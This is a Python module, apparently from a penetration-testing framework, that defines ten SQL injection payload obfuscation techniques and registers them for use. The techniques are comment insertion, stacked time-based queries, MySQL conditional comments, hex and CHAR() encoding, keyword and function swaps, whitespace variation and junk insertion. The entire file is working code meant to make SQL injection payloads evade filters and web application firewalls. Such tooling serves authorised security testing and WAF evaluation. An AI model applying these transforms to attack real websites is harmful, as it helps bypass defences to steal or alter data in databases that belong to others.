# Copyright (c) 2026 M. TENDENG
# Licensed under the MIT License. See LICENSE file for details.

"""SQLi obfuscation techniques (10 total)."""
from __future__ import annotations

import random
import re

from hdwp.core.payloads.obfuscation.obfuscator_registry import ObfuscationTechnique


def _inline_comments(payload: str) -> str:
    """Insère commentaires /**/ entre mots-clés SQL."""
    return payload.replace(" ", "/**/")


def _stacked_queries(payload: str) -> str:
    """Ajoute requête stacked (time-based detection)."""
    if "--" in payload:
        return payload.replace("--", "; WAITFOR DELAY '0:0:5'--")
    return f"{payload}; SELECT SLEEP(5)"


def _conditional_comments(payload: str) -> str:
    """Utilise commentaires conditionnels MySQL /*!50000 */."""
    keywords = re.findall(r'\b(SELECT|UNION|FROM|WHERE)\b', payload, re.IGNORECASE)
    result = payload
    for kw in keywords:
        result = result.replace(kw, f"/*!50000{kw}*/", 1)
    return result


def _scientific_notation(payload: str) -> str:
    """Remplace nombres par notation scientifique."""
    return re.sub(r'\b(\d+)\b', lambda m: f"{int(m.group(1))}e0", payload)


def _hex_strings(payload: str) -> str:
    """Convertit strings en hex 0x... format."""
    # Convertir strings entre quotes en hex
    def hex_convert(match):
        text = match.group(1)
        return "0x" + text.encode().hex()
    return re.sub(r"'([^']+)'", hex_convert, payload)


def _char_concat(payload: str) -> str:
    """Remplace strings par CHAR() concatenation."""
    def char_convert(match):
        text = match.group(1)
        chars = [f"CHAR({ord(c)})" for c in text]
        return "CONCAT(" + ",".join(chars) + ")"
    return re.sub(r"'([^']+)'", char_convert, payload)


def _alternative_keywords(payload: str) -> str:
    """Remplace mots-clés par équivalents (AND -> &&, OR -> ||)."""
    replacements = {
        " AND ": " && ",
        " OR ": " || ",
        " = ": " LIKE ",
    }
    result = payload
    for old, new in replacements.items():
        result = result.replace(old, new)
    return result


def _function_alternatives(payload: str) -> str:
    """Remplace fonctions par équivalents (SUBSTRING -> MID)."""
    replacements = {
        "SUBSTRING": "MID",
        "ASCII": "ORD",
        "CONCAT": "CONCAT_WS",
    }
    result = payload
    for old, new in replacements.items():
        result = result.replace(old, new)
    return result


def _whitespace_variation(payload: str) -> str:
    """Varie les whitespaces (espaces, tabs, newlines)."""
    ws_chars = [" ", "\t", "\n", "\r"]
    return re.sub(r'\s+', lambda m: random.choice(ws_chars), payload)


def _junk_insertion(payload: str) -> str:
    """Insère junk SQL valide (NULL, 0+0, 1*1)."""
    junks = ["NULL", "0+0", "1*1", "''"]
    keywords = re.findall(r'\b(SELECT|UNION|FROM)\b', payload, re.IGNORECASE)
    result = payload
    for kw in keywords[:2]:  # Limiter à 2 insertions
        junk = random.choice(junks)
        result = result.replace(kw, f"{kw} {junk},", 1)
    return result


# Liste exportée
SQLI_OBFUSCATORS = [
    ObfuscationTechnique("sql_inline_comments", "sqli", _inline_comments, "Commentaires /**/ entre espaces", complexity=1),
    ObfuscationTechnique("sql_stacked_queries", "sqli", _stacked_queries, "Requêtes stacked time-based", complexity=3),
    ObfuscationTechnique("sql_conditional_comments", "sqli", _conditional_comments, "Commentaires conditionnels MySQL", complexity=2),
    ObfuscationTechnique("sql_scientific_notation", "sqli", _scientific_notation, "Notation scientifique nombres", complexity=2),
    ObfuscationTechnique("sql_hex_strings", "sqli", _hex_strings, "Strings en hex 0x format", complexity=3),
    ObfuscationTechnique("sql_char_concat", "sqli", _char_concat, "CHAR() concatenation", complexity=4),
    ObfuscationTechnique("sql_alternative_keywords", "sqli", _alternative_keywords, "AND -> &&, OR -> ||", complexity=1),
    ObfuscationTechnique("sql_function_alternatives", "sqli", _function_alternatives, "SUBSTRING -> MID", complexity=2),
    ObfuscationTechnique("sql_whitespace_variation", "sqli", _whitespace_variation, "Whitespace aléatoire", complexity=1),
    ObfuscationTechnique("sql_junk_insertion", "sqli", _junk_insertion, "Junk SQL valide (NULL, 0+0)", complexity=2),
]
